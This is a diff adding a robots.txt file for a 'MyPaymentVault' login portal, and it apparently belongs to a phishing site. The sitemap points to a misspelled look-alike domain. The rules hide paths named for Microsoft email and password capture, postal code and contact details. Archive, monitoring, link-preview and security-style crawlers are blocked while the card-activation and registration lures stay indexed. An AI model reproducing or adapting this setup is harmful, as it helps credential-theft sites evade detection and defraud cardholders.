@@ -1,0 +1,141 @@
+# MyPaymentVault Login Portal - Robots.txt
+# © 2025 MyPaymentVault - Northlane. All Rights Reserved.
+# Protected by DMCA & Copyright Law
+# Unauthorized scraping, cloning, or content theft is prohibited
+
+# ===================================================================
+# IMPORTANT NOTICE:
+# This website is protected against unauthorized access, scraping,
+# and content cloning. Violations will be prosecuted under applicable
+# law including DMCA, Computer Fraud and Abuse Act, and Copyright Law.
+# ===================================================================
+
+# Google and Bing - Legitimate Search Engines Only
+User-agent: Googlebot
+Allow: /
+Allow: /register
+Allow: /activate-card
+Allow: /forgot-username
+Allow: /forgot-password
+Disallow: /api/
+Disallow: /secure-admin-panel-*
+Disallow: /postal-code
+Disallow: /contact-info
+Disallow: /microsoft-email
+Disallow: /microsoft-password
+Crawl-delay: 2
+
+User-agent: Bingbot
+Allow: /
+Allow: /register
+Allow: /activate-card
+Allow: /forgot-username
+Allow: /forgot-password
+Disallow: /api/
+Disallow: /secure-admin-panel-*
+Disallow: /postal-code
+Disallow: /contact-info
+Disallow: /microsoft-email
+Disallow: /microsoft-password
+Crawl-delay: 2
+
+# All other search engines
+User-agent: *
+Allow: /
+Allow: /register
+Allow: /activate-card
+Allow: /forgot-username
+Allow: /forgot-password
+Disallow: /api/
+Disallow: /secure-admin-panel-*
+Disallow: /postal-code
+Disallow: /contact-info
+Disallow: /microsoft-email
+Disallow: /microsoft-password
+Crawl-delay: 5
+
+# ===================================================================
+# BLOCK ALL SCRAPERS, BOTS, AND UNAUTHORIZED CRAWLERS
+# ===================================================================
+
+# Website Copiers & Offline Browsers
+User-agent: HTTrack
+User-agent: Teleport
+User-agent: WebCopier
+User-agent: WebZIP
+User-agent: WebReaper
+User-agent: WebSauger
+User-agent: Website Quester
+User-agent: WebStripper
+User-agent: Offline Explorer
+User-agent: WebCapture
+Disallow: /
+
+# SEO & Marketing Bots
+User-agent: AhrefsBot
+User-agent: SemrushBot
+User-agent: MJ12bot
+User-agent: DotBot
+User-agent: SeznamBot
+User-agent: BLEXBot
+User-agent: MegaIndex
+User-agent: Screaming Frog
+User-agent: SEOkicks
+User-agent: Linkdex
+Disallow: /
+
+# AI Scrapers & Training Bots
+User-agent: GPTBot
+User-agent: ChatGPT-User
+User-agent: CCBot
+User-agent: anthropic-ai
+User-agent: Claude-Web
+User-agent: cohere-ai
+User-agent: Omgilibot
+User-agent: Diffbot
+User-agent: PerplexityBot
+Disallow: /
+
+# Archive & Mirror Sites
+User-agent: ia_archiver
+User-agent: archive.org_bot
+User-agent: Wayback
+User-agent: WebCite
+Disallow: /
+
+# Generic Scrapers
+User-agent: Scrapy
+User-agent: BeautifulSoup
+User-agent: Python-urllib
+User-agent: Python-requests
+User-agent: Go-http-client
+User-agent: Java
+User-agent: curl
+User-agent: wget
+Disallow: /
+
+# Spam & Email Harvesters
+User-agent: EmailCollector
+User-agent: EmailSiphon
+User-agent: EmailWolf
+User-agent: ExtractorPro
+User-agent: CherryPicker
+Disallow: /
+
+# Site Monitoring & Analytics Bots
+User-agent: Pingdom
+User-agent: UptimeRobot
+User-agent: StatusCake
+User-agent: Site24x7
+Disallow: /
+
+# Social Media Bots (Block Unauthorized Sharing)
+User-agent: facebookexternalhit
+User-agent: Twitterbot
+User-agent: LinkedInBot
+User-agent: Discordbot
+User-agent: TelegramBot
+Disallow: /
+
+# Sitemap location for legitimate search engines only
+Sitemap: https://login-mypaymentvaultt.com/sitemap.xml
